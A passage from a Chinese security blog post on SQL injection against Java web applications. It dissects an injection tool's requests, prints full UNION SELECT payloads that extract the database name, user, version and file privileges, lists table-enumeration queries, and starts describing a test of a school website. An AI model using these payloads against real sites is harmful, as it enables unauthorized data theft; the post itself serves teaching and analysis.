+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image031.png" target="_blank" rel="external"><img title="clip_image031" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="343" alt="clip_image031" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image031_thumb.png" width="589" border="0"></a><br><br>  <br>￼<br><br>  <br>如果你足够聪明或仔细会发现他这样写有点浪费资源，因为他的order 是从1一直递增到争取的长度的假如字段特别长（一般情况下还是很少出现的）可能要执行几十个甚至是更多的HTTP请求，如果这里使用二分法或许可以很好的解决吧。</p>
+
+<p>我们接着往下看（还是点击start后发送的请求）：</p>
+
+<pre><code>/*</code><code>获取数据库相关信息*/</code></pre>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d),concat(0x5b64625d,database(),0x5b2f64625d,0x5b75735d,user(),0x5b2f75735d,0x5b765d,version(),0x5b2f765d)--</code></pre>
+
+<p>这玩意到底是什么神秘的东西呢？我们不妨在Navicat和FireFox里面瞅瞅：</p>
+
+<p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image032.png" target="_blank" rel="external"><img title="clip_image032" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="214" alt="clip_image032" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image032_thumb.png" width="1374" border="0"></a></p>
+
+<p>FireFox执行的结果：</p>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image033.png" target="_blank" rel="external"><img title="clip_image033" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="367" alt="clip_image033" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image033_thumb.png" width="1381" border="0"></a></p>
+
+<p>让我们来还原上面的那句废话：</p>
+
+<pre><code>select file_priv from mysql.user where user=root</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image034.png" target="_blank" rel="external"><img title="clip_image034" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="180" alt="clip_image034" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image034_thumb.png" width="559" border="0"></a></p>
+
+<p>上面很长很臭的SQL翻译过来就这么短的一句查询的结果就一个得到的信息就是：</p>
+
+<p>有没有file_priv权限。而file_priv应该就是文件读写权限了（没看手册，应该八九不离十）。如果不是Y是N那就不能load_file 、into outfile、dumpfile咯。</p>
+
+<p>接着看下一条SQL：</p>
+
+<pre><code>SELECT * from wps_posts where ID = 739 and 1=0 union select concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d),concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d)--</code></pre>
+
+<p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image035.png" target="_blank" rel="external"><img title="clip_image035" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="353" alt="clip_image035" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image035_thumb.png" width="1385" border="0"></a></p>
+
+<p>/*[h4ckinger]asim[/h4ckinger] 这段SQL看不出来有什么实际意义，没有对数据库进行任何操作。对应的SQL是：</p>
+
+<pre><code>select concat(0x5b6834636b696e6765725d,'asim',0x5b2f6834636b696e6765725d)*/</code></pre>
+
+<p>没用的东西不管下一条也是点击start后的最后一条SQL同上。<br>  <br>那么我们可以知道点击注入点检测程序一共做了：</p>
+
+<pre><code>1</code><code>、是否存在注入点</code></pre>
+
+<pre><code>2</code><code>、注入点的字段数量</code></pre>
+
+<pre><code>3</code><code>、注入点获取Mysql</code><code>的版本信息、用户信息、数据库名等。</code></pre>
+
+<pre><code>4</code><code>、是否有file_priv</code><code>也就是是否能够读写硬盘文件。</code></pre>
+
+<p>程序逻辑分析：</p>
+
+<pre><code>1</code><code>、获取URL</code><code>是否存在</code></pre>
+
+<pre><code>2</code><code>、获取URL</code><code>地址并进行参数分析</code></pre>
+
+<pre><code>3</code><code>、提交and 1=1 and 1=2</code><code>进行布尔判断，获取服务器的响应码判断是否存在SQL</code><code>注入。</code></pre>
+
+<pre><code>4</code><code>、提交占位符获取注入点查询的字段数尝试order by </code><code>注入。</code></pre>
+
+<pre><code>5</code><code>、提交MYSQL</code><code>自带的函数获取MYSQL</code><code>版本信息、用户信息、数据库名等信息。</code></pre>
+
+<pre><code>6</code><code>、检测是否有load_file</code><code>和outfile</code><code>、dumpfile</code><code>等权限。</code></pre>
+
+<p>SQL注入之获取所有用户表：</p>
+
+<pre><code>1</code><code>、Mssql:select name from master.dbo.sysdatabase</code></pre>
+
+<pre><code>2</code><code>、Mysql:show databases</code></pre>
+
+<pre><code>3</code><code>、Sybase:SELECT a.name,b.colid,b.name,c.name,b.usertype,b.length,CASE WHEN b.status=0 THEN 'NOT NULL' WHEN b.status=8 THEN 'NULL' END status, d.text FROM sysobjects a,syscolumns b,systypes c,syscomments d WHERE a.id=b.id AND b.usertype=c.usertype AND a.type='U' --AND a.name='t_user' AND b.cdefault*=d.id ORDER BY a.name,b.colid</code></pre>
+
+<pre><code>4</code><code>、Oracle:SELECT * FROM ALL_TABLES</code></pre>
+
+<h5>0x03 简单实战</h5>
+
+<hr align="center" width="100%" size="2">
+
+<p>本次实战并没有什么难度，感觉找一个能把前面的都串起来的demo太难了。本次实战的目标是某中学，网站使用JavaWeb开发。去年的时候通过POST注入绕过了GET的防注入检测。对其和开发商的官网都做了SQL注入检测，然后加了开发商的QQ通知修补。</p>
+
+<p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image036.png" target="_blank" rel="external"><img title="clip_image036" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="637" alt="clip_image036" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image036_thumb.png" width="753" border="0"></a></p>
+
+<p>前不久再去测试的时候发现漏洞已经被修补了，围观了下开发商后发现其用的是glassfish：</p>
+
+<p>￼<a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image037.png" target="_blank" rel="external"><img title="clip_image037" style="border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px" height="189" alt="clip_image037" src="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image037_thumb.png" width="576" border="0"></a></p>
+
+<p></p><p><a href="http://img.cker.in/JavaWeb4SQL2_9BEC/clip_image038.png" target="_blank" rel="external">&lt;img title=”clip_image038” style=”border-top-width: 0px; display: inline; border-left-width: 0px; border-bottom-width: 0px; border-right-width: 0px” height=”387” alt=”clip_image038” src=”http://img.cker.in/JavaWeb4SQL2_9B</a></p>
+
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/1039.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/1039.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/1039.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/1039.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/1040.seo/">
+        ← 攻击JavaWeb应用 5 -MVC安全
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/1038.seo/">
+        攻击JavaWeb应用 3 -SQL注入 1 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
